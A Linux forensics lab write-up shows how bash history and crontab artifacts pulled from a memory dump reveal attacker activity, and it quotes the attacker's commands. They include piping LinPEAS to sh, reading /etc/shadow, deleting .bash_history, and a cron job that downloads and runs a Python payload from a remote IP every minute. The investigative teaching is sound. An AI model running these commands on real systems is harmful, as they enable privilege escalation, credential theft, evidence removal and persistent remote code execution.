# Linux Bash History and Crontab

## Bash History

Bash history keeps a log of commands we've typed into the shell. This log helps to navigate previous actions quickly using arrow keys or commands like `history`, and it's stored both in memory (during the current session) and on disk (for persistence across sessions). From a security standpoint, this persistence can be a double-edged sword. On the one hand, it's great for auditing user activity, but it can be risky if the history file contains confidential or critical data.

### In-Memory Storage

During an active Bash session, commands are held in RAM. This allows instant access via up/down arrows or `[Ctrl + R]` for reverse search. The in-memory list is limited by the `HISTSIZE` environment variable, which often holds 500 or 1000 commands by default.

### On-Disk Storage

When we exit the shell, the session's history is appended to the `~/.bash_history` file, which is typically stored in the home directory of the corresponding user. Its file size is controlled by `HISTFILESIZE` and ensures that older commands are overwritten if the limit is exceeded.

### Bash History Configuration

Bash history can be configured either in the `~/.bashrc` or in `/etc/bash.bashrc` by setting the following environment variables:

| Variable | Description |
|---|---|
| `export HISTSIZE=1000` | In-memory limit: 1000 commands per session |
| `export HISTFILESIZE=2000` | On-disk limit: 2000 lines in `~/.bash_history` |
| `export HISTCONTROL=ignoreboth` | Ignore duplicates and commands starting with space |
| `export HISTIGNORE="ls:cd:pwd:exit:clear"` | Ignore common non-sensitive commands |
| `export HISTTIMEFORMAT="%F %T "` | Timestamp format before the command: YYYY-MM-DD HH:MM:SS <command> |
| `export HISTFILE=~/.secure_history` | Custom path. The file must be created first if it doesn't exist. |

## Bash History Review

We can utilize the `linux.bash.Bash` plugin to extract the bash history from the memory dump:

<img width="751" height="818" alt="image" src="https://github.com/user-attachments/assets/30e5a6c8-7ee4-4a1d-ad04-a7c98384c768" />

<img width="773" height="650" alt="image" src="https://github.com/user-attachments/assets/4416c251-3bc3-4f2b-9613-48267957b698" />

From the bash history extracted from the memory dump, it's evident that the entries at 18:45:25 include suspicious and malicious actions (disregarding the removed history at 18:34:48). Let’s filter by time:

<img width="732" height="626" alt="image" src="https://github.com/user-attachments/assets/227489c7-f197-4035-92db-daf0bc3cd85b" />

<img width="789" height="416" alt="image" src="https://github.com/user-attachments/assets/2bd06be3-a70a-4a4c-92a0-d5f20f34a482" />

Please note that the timestamp is not real in our case. Interesting commands executed:

| Command | Description |
|---|---|
| `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \| sh` | Linpeas bash script executed in memory. This script is used to find privilege escalation options |
| `find / -perm -u=s -type f 2>/dev/null` | Find command locates binaries having SUID permission that can be used for privilege escalation |
| `vim /etc/sudoers` | vim used to read/modify `/etc/sudoers` |
| `sudo bash` | bash executed with root privileges |
| `whoami` | whoami to get username |
| `cat /etc/passwd` | Get content of `/etc/passwd` (users) file (not used in this module) |
| `cat flag.txt` | Get content of `flag.txt` (not used in this module) |
| `rm flag.txt` | Delete `flag.txt` |
| `rm -rf ~/.bash_history` | Forcefully delete `.bash_history` file |
| `cat /etc/shadow` | Get content of `/etc/shadow` file that stores the hashed passwords |
| `sudo cat /etc/shadow` | The same command used with sudo |

Bash history content can also be found in `Linux.Sys.BashHistory.json` file:

<img width="795" height="655" alt="image" src="https://github.com/user-attachments/assets/467bc55a-41c6-4518-9d77-d390f07db6e8" />

The commands that are particularly noteworthy and have not been reviewed yet, or those that can provide us with additional context:

| Command | Description |
|---|---|
| `echo \"*/1 * * * * /usr/bin/run-one /usr/bin/python3 -c 'import requests, subprocess; loader=requests.get(\\\"http://18.117.8.128:8000/chattingloosened\\\"); subprocess.run(\\\"/usr/bin/python3\\\", input=loader.content)'\" \| crontab -` | Crontab is created to be executed every minute. Interesting is that it was executed as john user: `"OSPath":"/home/john/.bash_history"` |
| `ps aux \| grep -i python3` | List python3 processes, also executed by john user |
| `sudo cat /etc/shadow` | Get content `/etc/shadow` executed by user "user" |
| `vim /etc/sudoers` | Read/modify `/etc/sudoers` by user "user" |
| `sudo bash` | Bash executed as sudo by user "user" |

## Crontab Review

Since we've observed multiple instances of crontab usage, it's time to examine the crontab file.

<img width="772" height="694" alt="image" src="https://github.com/user-attachments/assets/4e37f51e-d2b6-4b72-aa9e-4b7b4d9d7e46" />

Crontab file was modified at 18:35:44:

<img width="753" height="260" alt="image" src="https://github.com/user-attachments/assets/da5d1efd-b46f-493c-bd1f-aa5a1cdea95b" />

## 🔑 Key Takeaway

Bash history and crontab artifacts provide valuable evidence of attacker activity, including privilege escalation, credential access, history deletion, and persistence. In this investigation, the history reveals the use of LinPEAS, modifications to `/etc/sudoers`, and the creation of a cron job that executes every minute to download and run a Python payload. Correlating these artifacts with memory and process evidence helps establish the attack timeline and identify how the attacker maintained execution.
